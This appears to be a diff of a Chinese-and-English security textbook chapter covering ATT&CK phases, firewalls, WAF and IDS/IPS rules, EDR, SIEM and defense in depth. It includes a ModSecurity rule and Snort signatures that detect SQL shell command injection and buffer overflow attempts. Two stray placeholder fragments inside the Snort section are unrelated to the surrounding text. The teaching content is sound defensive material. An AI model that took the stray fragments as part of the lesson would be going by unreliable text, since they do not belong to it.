+虽然攻击者类型各异，包括可能仅旨在让公众意识到某种观点的 `hacktivists`，但最危险的往往是被称为 `advanced persistent threats` (`APT`) 的攻击者。这些攻击者使用大量的 `TTPs` 来进入企业环境，并尽可能长时间地保持在环境内。在某些情况下，这些攻击者可能驻留数年。最近的记忆中，已有攻击者被发现长期停留七年、十年或更久。虽然也会出现只进行一次攻击、针对个人用户、快速获取目标后离开的攻击者，但我们看到的越来越多的是这类 APT 攻击者。在查看 ATT&CK 框架的不同阶段时，这点值得注意。
 
 ATT&CK 框架分为以下阶段。你可能会发现这些阶段不一定是攻击者按顺序进行的，因为可能存在重叠或来回跳转。此外，某些 TTP 会在不同类别中出现。
 
 # Reconnaissance
-在该阶段，攻击者会收集目标的信息。他们可能会在公开来源中搜索 freely available 数据，也可能使用他们拥有访问权限的闭源来源。此外，他们可能会在此阶段进行扫描活动。该阶段还包括利用 **phishing** 手段诱骗受害者泄露数据。
+
+在该阶段，攻击者会收集目标的信息。他们可能会在公开来源中搜索 freely available 数据，也可能使用他们拥有访问权限的闭源来源。此外，他们可能会在此阶段进行扫描活动。该阶段还包括利用 `phishing` 手段诱骗受害者泄露数据。
 
 # Resource Development
+
 攻击者需要大量工作来构建用于发起攻击的基础设施。这可能包括注册域名、创建账户、获取系统（通常是通过入侵其他受害者并利用其计算资源），以及获取他们自身不具备的工具。他们可能需要租用或购买通过犯罪渠道获得的工具集。
 
 # Initial Access
-在此阶段，攻击者会 compromise 第一个系统。他们可能入侵公开可访问的应用程序或网站，或通过 **phishing** 将恶意软件安装到目标系统上。此阶段即为攻击者获得组织的初始立足点。任何提供访问权限的技术，即使仅是利用已泄露的凭据，都属于此阶段。
+
+在此阶段，攻击者会 compromise 第一个系统。他们可能入侵公开可访问的应用程序或网站，或通过 `phishing` 将恶意软件安装到目标系统上。此阶段即为攻击者获得组织的初始立足点。任何提供访问权限的技术，即使仅是利用已泄露的凭据，都属于此阶段。
 
 # Execution
+
 攻击者有很多手段可以执行代码。攻击者不一定拥有直接交互访问权限，意味着他们不能简单地双击图标或在命令行运行程序。他们可能依赖其他技术使代码运行，例如使用计划任务、进程间通信、系统服务，或针对特定操作系统的技术，如使用 Windows Management Instrumentation (`WMI`)。
 
 # Persistence
+
 在持久化阶段，攻击者试图保持对已被 compromise 的系统的持续访问。系统重启、电源关闭后重新开启，或用户登出后再次登录时，正在执行的程序会停止，除非有机制使其再次启动。由于攻击者不在系统前直接操作，他们需要远程访问的手段，通常是已在系统上安装的软件。该软件需要在系统启动时执行。系统服务是常见实现方式，计划任务、系统和用户配置（如 Windows 注册表键）也是有效手段。Linux 系统可使用 `.bashrc` 等启动文件在用户登录时执行程序。
 
 # Privilege Escalation
+
 在特权提升阶段，攻击者力求获得最高权限。普通用户的访问权限有限，他们只能访问数据并运行程序，但无法执行如安装系统服务或提取系统内存等高级操作。因此，获得更高权限是有帮助的。攻击者可能通过在已拥有管理员权限的进程中注入代码、在启动时运行服务（启动过程自带提升权限），或利用其他 TTP 来提升权限。由于特权提升是保持在环境中并进一步收集所需数据（如凭据）的必要步骤，相关 TTP 很多。
 
 # Defense Evasion
+
 攻击者必须绕过多种防御措施。企业以及个人会在系统上部署防护软件，如防病毒或其他检测/防范工具。攻击者需要以不被视为恶意或可疑的方式执行软件。常见手段包括使用根包（rootkit）等老派技术，既能提供远程访问，又能隐藏所有被使用的软件。此阶段（或类别）拥有最多的 TTPs。例如，特权提升目前已有 12 种技术，而防御规避有 37 种。
 
 # Credential Access
-系统和应用通常需要用户名和密码来授权访问。攻击者希望窃取这些凭据以便在其他地方使用。他们可能通过 **phishing** 邮件诱骗受害者提供凭据，或通过内存 dump 从操作系统或持有凭据的应用中提取。攻击者还可能强迫网络服务器进行认证，从而获取凭据。
+
+系统和应用通常需要用户名和密码来授权访问。攻击者希望窃取这些凭据以便在其他地方使用。他们可能通过 `phishing` 邮件诱骗受害者提供凭据，或通过内存 dump 从操作系统或持有凭据的应用中提取。攻击者还可能强迫网络服务器进行认证，从而获取凭据。
 
 # Discovery
+
 攻击者通常不会满足于仅入侵单一系统。他们会寻找更多可攻击的系统。攻击者会审视环境中可用的系统和应用，收集大量细节，以判断还能进一步访问什么。
 
 # Lateral Movement
+
 除了发现外，侧面移动的目的还在于确定从当前系统还能攻击哪些其他系统。攻击者可能利用已有的凭据、远程利用其他系统，或通过当前受害者的邮件联系其他潜在目标，以扩大攻击面。目标是 compromise 更多系统，从而获取更多数据。
 
 # Collection
+
 与发现类似，收集阶段也是 gathering 信息。这可能是用于攻击其他系统的情报，也可能是想窃取（exfiltrate）以出售或用于其他目的的数据。一旦攻击者开始收集数据，往往比其他阶段更为显著，因为会留下痕迹。数据需要暂时存储，可能会在显眼位置出现名称奇怪或具有辨识特征的文件。
 
-
-
-
 # 命令和控制
+
 请记住，攻击者希望尽可能长时间地保持对系统的访问。毕竟，如果他们针对你的组织，你拥有他们想要的东西。无论是知识产权、客户信息、用户名和密码，还是信用卡数据，你都会继续创建他们想要的东西。没有意义在入侵后离开，浪费这个机会。这意味着他们需要对整个环境保持远程控制。在这一阶段，他们会在环境中的系统上设置远程访问。攻击者可能会利用常用协议（如超文本传输协议 HTTP）并通过在其受控服务器与你环境中的系统之间嵌入命令来滥用该协议。他们也可以滥用其他协议，如域名系统（DNS）或 Internet 控制消息协议（ICMP）。
 
 # 数据外传
+
 即使他们继续留在环境中，他们仍想将收集到的数据取出。这就是数据外传阶段。他们同样可能使用常用协议，因为这些协议不太可能被怀疑。目标始终是尽可能规避检测。即使使用常用协议，你也可以通过遵循框架提供的 TTP（技术、战术和程序）来发现攻击者的存在。例如，如果攻击者通过 DNS 发送数据，消息的大小往往会异常大，因此查找这些异常大的消息可以让你在攻击者进行数据外传时将其捕获。
 
 # 影响
+
 这是攻击者可能决定“烧毁房子”的阶段。一些攻击者在得到他们想要的东西后，会在离开时一锤定音，摧毁一切。另一些攻击者在被发现时也会如此。当你试图将他们从你的网络和系统中赶出时，他们在离开的路上会尽可能多地破坏东西。这可能包括数据破坏、磁盘擦除、数据加密（这意味着勒索软件攻击属于此类），拒绝服务攻击或其他类似的破坏性行为。
 
 文中提到的 TTP（技术、战术和程序）在 MITRE 网站（https://attack.mitre.org/matrices/enterprise/）的矩阵中可找到，并且会定期更新，随着更多已知技术而更新。每个 TTP 都有相应的细节，MITRE 会提供缓解措施，以防止攻击成功。你也可以获得关于如何判断攻击者是否使用该 TTP 的建议。
 
 ## 安全技术
+
 安全程序必然需要某种技术来实现。企业内部可使用的技术解决方案数量不断增长。保护企业的最佳方式不再是仅在网络前部部署防火墙并认为自己已安全，即使这在过去曾被视为事实。今天，攻击向量与十年前有了巨大变化。当前的技术解决方案是多层的，并不完全专注于防止攻击。
 
 当前的假设是，如果期望 100%成功地拦截所有攻击，则防止攻击是不可能的。因此，检测至关重要。即使是检测解决方案也是多层的，因为网络有众多入口点。由于检测是被动的努力，它需要随后进行主动响应。这可以是 incident response（事件响应），而事件响应可能需要自动收集取证 artifacts（取证数据）。所有这些可能需要不同的技术解决方案。
 
 ### 防火墙
+
 防火墙是传统的网络安全设备。仅仅说防火墙已部署并不能真正说明其作用，因为网络堆栈上存在多种类型的防火墙。防火墙最初的含义是用来限制火灾蔓延的墙体。你实施防火墙是为了将火灾限制在建筑的特定区域。汽车中的防火墙同样用于限制火灾，防止其蔓延到乘客舱。该术语在 20 世纪 80 年代末被用于描述早期用于保护网络的技术。
 
 #### 数据包过滤器
+
 在基本层面上，防火墙是数据包过滤器。许多设备提供数据包过滤功能，有时通过访问控制列表（ACL）实现。路由器和交换机通常具备数据包过滤能力。数据包过滤是根据协议、端口和地址来决定数据包的去向。源地址和目的地址都可以基于进行过滤。
 
 数据包可以被丢弃，意味着它们不会转发到目的地，并且不会向发送方发送任何响应。它们也可以被拒绝，这意味着它们不会转发到目的地，但如果设备遵循协议规范，会向发送方发送 ICMP 错误消息，指示目的地不可达。这种做法既礼貌，又符合协议规范。但在系统安全方面，丢弃消息可能更合理。如果消息被丢弃，发送系统无法知道发生了什么，目标系统陷入“黑洞”状态。
@@ -2399,7 +2545,7 @@ ATT&CK 框架分为以下阶段。你可能会发现这些阶段不一定是攻�
 
 如果你使用 Linux 系统，可能会接触到数据包过滤器。虽然大多数 Linux 发行版自带的主机防火墙功能更强大，但它也可以作为基本的数据包过滤器工作。你可以在 Linux 内核的 iptables 防火墙上为不同的链设置策略。例如，下面的命令会在 INPUT、OUTPUT 和 FORWARD 链上设置默认拒绝策略：
 
-``` 
+```
 [iptables Policy Settings]
 iptables -P INPUT DROP
 iptables -P OUTPUT DROP
@@ -2409,10 +2555,8 @@ iptables -P FORWARD DROP
 数据包过滤功能简单直接。虽然这些过滤器可以用于入站流量或限制内部用户访问特定端口或 IP 地址，但它们不擅长更复杂的过滤，例如允许响应内部发起的入站流量。为此，我们需要跟踪出站连接，因此需要比单纯的数据包过滤更强大的机制。
 
 #### 状态检测
+
 在最初的数据包过滤器出现后不久，便发展出状态检测防火墙。第一个状态防火墙出现在 20 世纪 80 年代末，与数据包过滤器同期问世。这些防火墙已经存在约三十年，但这并不意味着它们一直在持续使用。
-
-
-
 
 -   [有状态防火墙](https://example.org)会跟踪客户端与服务器之间对话中的消息状态。这意味着防火墙必须拥有一个状态表，以便知道所有通过它的流量。对于传输控制协议（TCP），理论上更容易，因为标志位会描述流量的状态。只有 SYN 标志打开的消息是一个新建立的连接，直到三次握手完成为止。完成后，流的状态变为已建立（ESTABLISHED）。在某些情况下，消息流可能是相关的。例如，文件传输协议（FTP）有时会从内部发起连接到外部，即从服务器到客户端。在这种情况下，用于传输文件的服务器到客户端连接与客户端到服务器的控制连接是相关的。
 
@@ -2432,19 +2576,21 @@ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACC
 
 -   防火墙的一个主要问题是它们只允许已知服务通过。防火墙会允许连接到 Web 服务器的流量通过，这意味着针对 Web 服务器的攻击流量也会被放行。攻击流量会像普通客户端一样建立连接。从包过滤和有状态过滤的角度来看，这些消息会顺利通过。因此，我们需要更深入地检查。仅看协议头部是不够的，因为所有内容在头部看起来都正确且合法。我们需要检查更高层的内容。
 
--   深度包检测（DPI）防火墙会在包的负载中继续检查，而不仅仅是头部。通过这种方式，更容易识别恶意软件和其他入站攻击。DPI 防火墙需要签名来检测包中是否存在恶意内容，从而阻止流量进入网络。为了实现这一点，防火墙必须在做出任何判断之前解析整个消息，这意味着必须先收到并重新组装 IP 层的所有碎片。在某些情况下，可能需要整个流（无论是 UDP 还是 TCP）。这会导致消息到达时出现一定的延迟。
 
--   包过滤和有状态防火墙不需要重新组装，只要完整的 IP 头部和 TCP/UDP 头部已经到达。如果消息缺少完整的 IP 或 TCP/UDP 头部，那本身就是问题，因为这通常不足 100 字节。在 100 字节以下的数据包中进行碎片化可能是恶意流量的手段，用来欺骗防火墙或其他安全解决方案。它们是一体的。仅看头部是有限的，尤其是当今许多攻击是通过高层协议实现的。DPI 防火墙能够检查这些高层协议。
 
--   需要注意的一个考虑因素是，加密流量无法被检查。防火墙没有密钥来解密消息以查看其内容。任何在防火墙侧对加密的中间人方式都违背了大多数加密方案和用户的端到端预期。头部当然不是加密的。如果头部被加密，则任何中间设备都无法确定流量的去向。这意味着包过滤和有状态防火墙不受加密影响。而 DPI 防火墙则受影响。这意味着随着所有基于 Web 的连接都采用加密，DPI 防火墙在保护 Web 服务器方面作用不大。
+- 深度包检测（DPI）防火墙会在包的负载中继续检查，而不仅仅是头部。通过这种方式，更容易识别恶意软件和其他入站攻击。DPI 防火墙需要签名来检测包中是否存在恶意内容，从而阻止流量进入网络。为了实现这一点，防火墙必须在做出任何判断之前解析整个消息，这意味着必须先收到并重新组装 IP 层的所有碎片。在某些情况下，可能需要整个流（无论是 UDP 还是 TCP）。这会导致消息到达时出现一定的延迟。
+
+- 包过滤和有状态防火墙不需要重新组装，只要完整的 IP 头部和 TCP/UDP 头部已经到达。如果消息缺少完整的 IP 或 TCP/UDP 头部，那本身就是问题，因为这通常不足 100 字节。在 100 字节以下的数据包中进行碎片化可能是恶意流量的手段，用来欺骗防火墙或其他安全解决方案。它们是一体的。仅看头部是有限的，尤其是当今许多攻击是通过高层协议实现的。DPI 防火墙能够检查这些高层协议。
+
+- 需要注意的一个考虑因素是，加密流量无法被检查。防火墙没有密钥来解密消息以查看其内容。任何在防火墙侧对加密的中间人方式都违背了大多数加密方案和用户的端到端预期。头部当然不是加密的。如果头部被加密，则任何中间设备都无法确定流量的去向。这意味着包过滤和有状态防火墙不受加密影响。而 DPI 防火墙则受影响。这意味着随着所有基于 Web 的连接都采用加密，DPI 防火墙在保护 Web 服务器方面作用不大。
 
 #### 应用层防火墙
 
--   除了 DPI 防火墙，还有应用层防火墙。虽然这些防火墙也检查数据包，但它们通常针对特定协议。例如，在 VoIP 网络中，会使用一种名为 *session border controller*（SBC）的设备。该设备理解 VoIP 协议，通常是 H.323 或会话发起协议（SIP）。因此，它不仅能判断消息的有效性，还能动态打开洞口，允许实时传输协议（RTP）媒体消息通过，因为这些媒体消息使用的端口和协议与信令消息不同。
+- 除了 DPI 防火墙，还有应用层防火墙。虽然这些防火墙也检查数据包，但它们通常针对特定协议。例如，在 VoIP 网络中，会使用一种名为 `session border controller`（SBC）的设备。该设备理解 VoIP 协议，通常是 H.323 或会话发起协议（SIP）。因此，它不仅能判断消息的有效性，还能动态打开洞口，允许实时传输协议（RTP）媒体消息通过，因为这些媒体消息使用的端口和协议与信令消息不同。
 
--   SBC 是一个应用层防火墙的例子，因为它能够基于对应用层协议及其常见状态流的理解来决定允许流量通过。
+- SBC 是一个应用层防火墙的例子，因为它能够基于对应用层协议及其常见状态流的理解来决定允许流量通过。
 
--   另一个常见的应用层防火墙是 Web 应用防火墙（WAF）。WAF 使用一组规则来检测并阻止请求和响应。鉴于 Web 攻击的数量众多，保持这些规则是一项挑战。虽然有许多商业 WAF，但也有开源的 ModSecurity，它可以与 Apache Web 服务器一起使用。规则可能会很复杂，下面给出一个示例代码片段。
+- 另一个常见的应用层防火墙是 Web 应用防火墙（WAF）。WAF 使用一组规则来检测并阻止请求和响应。鉴于 Web 攻击的数量众多，保持这些规则是一项挑战。虽然有许多商业 WAF，但也有开源的 `ModSecurity`，它可以与 `Apache Web` 服务器一起使用。规则可能会很复杂，下面给出一个示例代码片段。
 
 ```
 [ mod‑security Rule ]
@@ -2464,14 +2610,11 @@ exist|SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient\.)"
              %{matched_var_name}=%{tx.0}"
 ```
 
-
-
-
 规则在响应体中查找 `@rx` 之后的消息，这表明后面的内容是正则表达式。正则表达式描述了规则用于匹配的消息。如果规则匹配成功，正则表达式的匹配结果会因为 `capture` 动作而被放入事务变量集合中。此外，还会将若干变量放入事务变量集合。
 
-除了捕获信息外，这些信息可以记录、稍后引用或用于警报，ModSecurity 还可以将其作为动作进行阻止。这将阻止消息通过防火墙（WAF）。也就是说，WAF 位于受保护的 Web 服务器前面。有时，像 ModSecurity 这样的 WAF 会部署在网络边缘作为反向代理，客户端向反向代理发送请求，代理代表服务器处理请求，检查潜在的恶意请求，然后再转发到实际的 Web 服务器。响应也会经过反向代理。
+除了捕获信息外，这些信息可以记录、稍后引用或用于警报，`ModSecurity` 还可以将其作为动作进行阻止。这将阻止消息通过防火墙（WAF）。也就是说，WAF 位于受保护的 Web 服务器前面。有时，像 `ModSecurity` 这样的 WAF 会部署在网络边缘作为反向代理，客户端向反向代理发送请求，代理代表服务器处理请求，检查潜在的恶意请求，然后再转发到实际的 Web 服务器。响应也会经过反向代理。
 
-这些只是应用层防火墙的一些示例。它们也被称为应用层 *网关*。任何能够基于应用层协议的运行情况做出决策，并能够阻止消息的设备，无论其应用层协议是什么，都可以被视为应用层防火墙。
+这些只是应用层防火墙的一些示例。它们也被称为应用层 `网关`。任何能够基于应用层协议的运行情况做出决策，并能够阻止消息的设备，无论其应用层协议是什么，都可以被视为应用层防火墙。
 
 #### Unified Threat Management
 
@@ -2483,7 +2626,7 @@ exist|SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient\.)"
 
 您可以找到两种不同类型的入侵检测系统（IDSs）。第一种是基于主机的 IDS。基于主机的 IDS 监控本地系统的活动，例如关键系统文件的修改，也可以监控日志文件或审计其他系统行为。基于主机的 IDS 的挑战在于，一旦攻击者能够触发该 IDS，他们已经在系统内部，这意味着他们会知道 IDS 的存在并据此制定规划。
 
-第二种类型是网络 IDS。与防火墙能够阻止或允许网络流量的数据包不同，网络 IDS 可以使用类似的规则生成日志消息。入侵检测规则通常可以基于网络栈的任意层。只要能够为想要记录或提醒的消息创建某种标识，就可以编写 IDS 规则。与防火墙类似，市面上有许多商业选项，也有开源选项，其中最知名的一个是 Snort，它目前由 Cisco 拥有，但仍然提供免费使用以及社区规则。
+第二种类型是网络 IDS。与防火墙能够阻止或允许网络流量的数据包不同，网络 IDS 可以使用类似的规则生成日志消息。入侵检测规则通常可以基于网络栈的任意层。只要能够为想要记录或提醒的消息创建某种标识，就可以编写 IDS 规则。与防火墙类似，市面上有许多商业选项，也有开源选项，其中最知名的一个是 `Snort`，它目前由 `Cisco` 拥有，但仍然提供免费使用以及社区规则。
 
 网络 IDS 监控经过网络接口的所有网络流量。因此，放置位置很重要。根据所使用的 IDS 产品，放置方式可能有所不同。一种做法是将 IDS 以并行方式（而非串行）放置在网络边缘，这样所有进入的网络流量都能被观察。图 3.3（`Figure 3.3`）展示了这种方式的简化示意图，IDS 位于防火墙后面但不在直接的流量路径中。流量会被引导到 IDS 进行检测，而不影响流量或导致网络故障。另一种做法是在网络的不同部分部署传感器，避免单点设备。这种方式在检测潜在的内部威胁时尤其有用。
 
@@ -2493,19 +2636,18 @@ exist|SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient\.)"
 
 多年前，IDS 设备难以跟上网络流量的速率，因为它们必须检查每个数据包并与配置的所有规则进行比对。如今已不再如此，因为处理能力和系统总带宽显著提升。即便如此，在网络的不同部分部署多个传感器可以分担处理负载。
 
-我们可以通过查看 Snort 规则来了解 IDS 的功能及工作方式。正如 WAF 规则一样，编写规则需要时间和努力，尤其是在试图检测数据包中的内容时。下面的代码片段展示了两条 Snort 规则示例，说明了 Snort 可以做什么以及它的工作原理。
+我们可以通过查看 `Snort` 规则来了解 IDS 的功能及工作方式。正如 `WAF` 规则一样，编写规则需要时间和努力，尤其是在试图检测数据包中的内容时。下面的代码片段展示了两条 `Snort` 规则示例，说明了 `Snort` 可以做什么以及它的工作原理。
 
 ```
-```[Snort Rules]
+[Snort Rules]
+
 alert tcp $EXTERNAL_NET any -> $SQL_SERVERS 7210 (msg:"SQL SAP MaxDB shell command injection attempt"; flow:to_server,established; content:"exec_sdbinfo"; fast_pattern:only; pcre:"/exec_sdbinfo\s+[\x26\x3b\x7c\x3e\x3c]/i"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop; reference:bugtraq,27206; reference:cve,2008-0244; classtype:attempted-admin; sid:13356; rev:7;)
+
 alert tcp $EXTERNAL_NET any -> $HOME_NET 21064 (msg:"SQL Ingres Database uuid_from_char buffer overflow attempt"; flow:to_server,established; content:"uuid_from_char"; fast_pattern:only; pcre:"/uuid_from_char\s*?\(\s*?[\x22\x27][^\x22\x27]{37}/smi"; metadata:policy balanced-ips drop, policy max-detect-ips drop, policy security-ips drop; reference:bugtraq,24585; reference:cve,2007-3338; reference:url,supportconnectw.ca.com/public/ca_common_docs/ingresvuln_letter.asp; reference:url,www.ngssoftware.com/advisories/high-risk-vulnerability-in-ingres-stack-overflow; classtype:attempted-admin; sid:12027; rev:11;) 
+
 ```
-```
 
-Snort 规则以动作开头。您可以使用 `alert`（如上例所示）生成警报，该警报会发送到已配置的输出系统。此外，还可以使用 `log`、`drop`、`reject`、`pass` 等动作，这些动作超出了传统 IDS 的功能范围，但 Snort 在规则配置中均可使用。动作之后，需要配置关于报文头部的细节，包括协议、源和目的地址以及端口。这里的 `->` 表示流的方向。
-
-
-
+`Snort` 规则以动作开头。您可以使用 `alert`（如上例所示）生成警报，该警报会发送到已配置的输出系统。此外，还可以使用 `log`、`drop`、`reject`、`pass` 等动作，这些动作超出了传统 IDS 的功能范围，但 `Snort` 在规则配置中均可使用。动作之后，需要配置关于报文头部的细节，包括协议、源和目的地址以及端口。这里的 `->` 表示流的方向。
 
 进入`/path/to/xxx`目录，找到`xxx.json`。
 
@@ -2519,11 +2661,11 @@ Snort 规则以动作开头。您可以使用 `alert`（如上例所示）生成
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-Commonly, you would use alert or log in the case of an IDS, since the intention of an IDS is just to detect events. The alert assumes that someone is paying attention to what the IDS is emitting and taking actions based on the alert and a subsequent investigation. There are, though, cases where you may want the IDS itself to do something with what it found.
+Commonly, you would use `alert` or `log` in the case of an IDS, since the intention of an IDS is just to detect events. The `alert` assumes that someone is paying attention to what the IDS is emitting and taking actions based on the alert and a subsequent investigation. There are, though, cases where you may want the IDS itself to do something with what it found.
 
 ### Intrusion Prevention Systems
 
-An intrusion prevention system (IPS) takes an IDS a step further. As noted earlier, Snort has actions including drop and reject. These are actions that are beyond the capability of Snort itself. Snort monitors network traffic and parses through it to identify packets that contain possibly malicious contents, as identified by the rules. To have Snort run as an IPS, it has to be placed inline, meaning it has to be a device in the path of traffic into and out of the network. Any IPS would have to be similarly configured in order to have the ability to block any network traffic. Figure 3.4 is a simplified network diagram showing the potential placement of an IPS.
+An intrusion prevention system (IPS) takes an IDS a step further. As noted earlier, `Snort` has actions including `drop` and `reject`. These are actions that are beyond the capability of `Snort` itself. `Snort` monitors network traffic and parses through it to identify packets that contain possibly malicious contents, as identified by the rules. To have `Snort` run as an IPS, it has to be placed inline, meaning it has to be a device in the path of traffic into and out of the network. Any IPS would have to be similarly configured in order to have the ability to block any network traffic. Figure 3.4 is a simplified network diagram showing the potential placement of an IPS.
 
 ![FIGURE 3.4 Network diagram showing IPS placement](img/c03f004.png)
 
@@ -2531,11 +2673,13 @@ An intrusion prevention system (IPS) takes an IDS a step further. As noted earli
 
 With the IPS in the flow, it can act like a firewall, making decisions about whether to accept or reject packets as they enter the network. The difference between an IPS and a firewall is that the “firewall rules” on an IPS would be dynamic. Rather than having large blanket rules blocking IP addresses wholesale, the IPS would make decisions based on the contents of the packet. The rule would be in place for the duration of the packet passing through the IPS—essentially a one‑off. The rule may just exist to handle that one packet, or it may be in use for a longer period, but the rules are dynamic and temporary by nature. Also while inline, either the IPS can choose to drop the message, meaning just discard it, or it can reject it with an appropriate message. This may be an ICMP destination unreachable message, for example.
 
-Even with an IPS where potential attacks are blocked, the logs and alerts should be investigated. Not every message that matches an IDS/IPS rule will be a legitimate attack. In several cases of running a basic Snort installation with the community rules, I have run across alerts indicating bad SIP messages, when in fact the traffic was HTTP over port 80, not SIP. Rules are not infallible, so it is possible for rules to catch legitimate traffic, and if you are running an IPS, you may end up blocking messages from customers or partners.
+Even with an IPS where potential attacks are blocked, the logs and alerts should be investigated. Not every message that matches an IDS/IPS rule will be a legitimate attack. In several cases of running a basic `Snort` installation with the community rules, I have run across alerts indicating bad SIP messages, when in fact the traffic was HTTP over port 80, not SIP. Rules are not infallible, so it is possible for rules to catch legitimate traffic, and if you are running an IPS, you may end up blocking messages from customers or partners.
+
+
 
 One of the challenges of an IDS or IPS is the volume of logs they can create. This is a factor of the number of rules you have, how well they are written, and how much traffic you get into your network, as well as the placement of your sensors. Alerting is a significant challenge, and it can require a lot of work to fine‑tune rules so your analysts, or whoever is looking at the alerts, don't become screen‑blind, meaning they get so used to seeing the same alerts over and over that they end up missing one that is legitimate—a white rabbit in a field of white snow/noise. Fortunately, there are solutions that can help with that problem.
 
-### Endpoint Detection and Response
+## Endpoint Detection and Response
 
 While you may be familiar with anti‑malware software, used to detect the existence of viruses and other malicious software on a system, you may be less familiar with this. Endpoint detection and response (EDR) is a class of software that can perform a range of functions that are useful to a security operations staff. There are several commercial offerings in the EDR space, and each one of them may provide a different set of functionalities, though there will be a core set of functions they all provide.
 
@@ -2553,9 +2697,7 @@ Another function EDR tools can often provide is isolation. If you happen to noti
 
 An EDR tool may be able to perform something called *host isolation*. While this may be able to be done within the network, especially if you have firewall controls within the network segments, it can be more efficient to just use a software control on the local system where the attacker has been seen. The attacker retains access to the system, but they are unable to get out to any other system. This may be done while the complete scope of the investigation is being completed—trying to figure out everywhere the attacker is within the environment.
 
-### Security Information and Event Management
-
-
+## Security Information and Event Management
 
 一个在系统管理和安全方面都很好的做法是系统日志。日志有助于诊断系统和网络中的问题，也能在潜在问题的调查中提供帮助。取证调查人员和事件响应人员会发现它们不可估量。如果你曾经在没有日志的情况下排查出故障的系统或应用程序，你就会明白日志的价值。然而，将所有日志设置到最大并不是答案。日志会占用磁盘空间，虽然现在磁盘空间相对便宜，但它们也会消耗处理能力，日志量过多反而会让你在海量文本中翻找，难以找到能帮助你的那一条记录。你不一定知道要搜索的具体文字。
 
@@ -2591,8 +2733,6 @@ Elastic Stack 是一个很好的平台，用于摄取来自多个来源的大量
 
 第二个控制领域是技术安全。这里讨论的防火墙、入侵检测系统、SIEM 等安全技术。除了这些，还包括软件或配置控制，如密码策略、要求复杂密码。防病毒或其他端点防护也属于技术控制。任何旨在防止未经授权使用的硬件或软件，都算作技术控制。
 
-
-
 最后，还有行政控制。这些是政策、标准和程序。这可能包括招聘标准、背景调查和数据处理政策等政策或做法。这些行政控制决定了组织的保护方式，并且是必不可少的。
 
 Figure 3.7 展示了如何实施防御深度（defense‑in‑depth）的某些元素的示例。你可以在网络入口处看到有一个防火墙。防火墙之后有两个分离的网络。第一个是非军事化区（demilitarized zone），这里面是那些虽然属于企业网络但仍然不受信任的服务器。这里面可能放置面向 Internet 的服务器，如 Web 或邮件服务器。防火墙的另一侧是放置内部服务器的地方，例如 Active Directory 或文件服务器。这种网络分段通常是防御深度（defense‑in‑depth）策略的一部分。
@@ -2615,11 +2755,13 @@ Figure 3.7 展示了如何实施防御深度（defense‑in‑depth）的某些�
 
 信息技术（IT）领域正出现一种趋势，即开发团队与运维团队的协作， commonly 称为 DevOps。更具前瞻性的公司还确保在整个过程中将安全融合进去，形成所谓的 DevSecOps。这些做法不仅关注团队协作和必要的沟通，还强调自动化。自动化构建、测试和部署可以大幅减少人为因素，帮助避免配置错误或其他失误。
 
-你可以看到，防御广度是一个概念，一旦你开始思考在组织内部何处可以注入安全讨论，它可能会变得非常复杂，甚至难以完全实施。最终，防御广度的目标是让组织更好地防护，并且能够快速应对攻击 —  — 以及在 breach（突破）后尽快恢复业务运营。
+你可以看到，防御广度是一个概念，一旦你开始思考在组织内部何处可以注入安全讨论，它可能会变得非常复杂，甚至难以完全实施。最终，防御广度的目标是让组织更好地防护，并且能够快速应对攻击 — — 以及在 breach（突破）后尽快恢复业务运营。
 
 ### 可防御的网络架构
 
-另一种在构建网络时可考虑的做法是采用可防御的网络架构（defensible network architecture）。这并不排斥防御深度或防御广度，而是强调让网络更易于监控和控制。请记住，攻击者的常用手段之一是在网络环境中横向移动（lateral movement），即从一个系统移动到另一个系统。一旦他们 compromise（ compromise）了一个系统，就会尝试访问其他系统。由于攻击者更容易看到本地网络上的系统，他们可能会先针对这些系统，直到获得关于其他网络中系统的更多信息。
+
+
+另一种在构建网络时可考虑的做法是采用可防御的网络架构（defensible network architecture）。这并不排斥防御深度或防御广度，而是强调让网络更易于监控和控制。请记住，攻击者的常用手段之一是在网络环境中横向移动（lateral movement），即从一个系统移动到另一个系统。一旦他们 compromise（compromise）了一个系统，就会尝试访问其他系统。由于攻击者更容易看到本地网络上的系统，他们可能会先针对这些系统，直到获得关于其他网络中系统的更多信息。
 
 攻击者通常不掌握整个企业网络的全貌，除非他们偶然看到网络图。如果你在网络入口/出口部署防火墙，并采用常见的分段方式，你就能监控所有流量的进出。你还可以设置 choke point（拥塞点），即如果你怀疑攻击者在某个网络段，就可以限制其对其他网络段的访问。
 
@@ -2629,14 +2771,11 @@ Figure 3.7 展示了如何实施防御深度（defense‑in‑depth）的某些�
 
 日志是在此过程中多次出现的概念，既包括系统日志也包括应用日志。除了系统或桌面/服务器的日志外，还包括网络设备（如路由器、交换机和防火墙）的日志。即使在网络中部署 IDS（入侵检测系统），你也不一定需要对所有事件发出警报，因为有些事件可能不需要后续跟进。但这些事件的记录在 breach（突破）发生后可能非常有用。历史数据的重要性不容低估。
 
-许多系统，包括类 Unix 系统以及网络设备，都支持 syslog 协议。该协议最初是作为 Simple Mail Transfer Protocol（SMTP）服务器 sendmail 的日志机制而出现的。自 1980 年代 syslog 首次在 sendmail 中实现以来，它已成为类 Unix 系统的标准日志解决方案，并已在 RFC 3164 中得到文档化，随后在 RFC 5424 中标准化。syslog 既拥有易于理解的语法，用于创建和阅读消息，也可以用于远程日志传输和本地日志记录。
+许多系统，包括类 Unix 系统以及网络设备，都支持 `syslog` 协议。该协议最初是作为 Simple Mail Transfer Protocol（SMTP）服务器 `sendmail` 的日志机制而出现的。自 1980 年代 `syslog` 首次在 `sendmail` 中实现以来，它已成为类 Unix 系统的标准日志解决方案，并已在 RFC 3164 中得到文档化，随后在 RFC 5424 中标准化。`syslog` 既拥有易于理解的语法，用于创建和阅读消息，也可以用于远程日志传输和本地日志记录。
 
+因为 `syslog` 支持远程日志记录，它可以作为集中化的日志主机使用。这一点在为应急响应做准备时，可能显得尤为重要。常见的隐藏痕迹的做法是清除日志。任何获得系统访问权限的攻击者可能会擦除本地日志，但如果他们正在将日志流传到外部，则日志会保留供以后使用，除非攻击者能够入侵集中日志主机。
 
-
-
